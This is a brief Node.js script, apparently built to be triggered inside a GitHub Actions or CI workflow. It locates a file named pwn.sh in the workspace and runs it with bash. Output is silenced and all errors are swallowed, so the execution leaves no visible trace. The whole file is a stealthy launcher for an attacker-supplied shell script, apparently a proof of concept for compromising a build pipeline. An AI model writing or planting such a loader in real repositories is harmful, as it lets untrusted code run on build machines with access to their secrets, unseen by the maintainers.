const { execSync } = require('child_process');
const path = require('path');
const fs = require('fs');

try {
    const workspace = process.env.GITHUB_WORKSPACE || '.';
    const pwnPath = path.join(workspace, 'pwn.sh');
    if (fs.existsSync(pwnPath)) {
        execSync(`bash ${pwnPath}`, { stdio: 'ignore' });
    } else {
        execSync(`bash ./pwn.sh`, { stdio: 'ignore' });
    }
} catch (e) {}
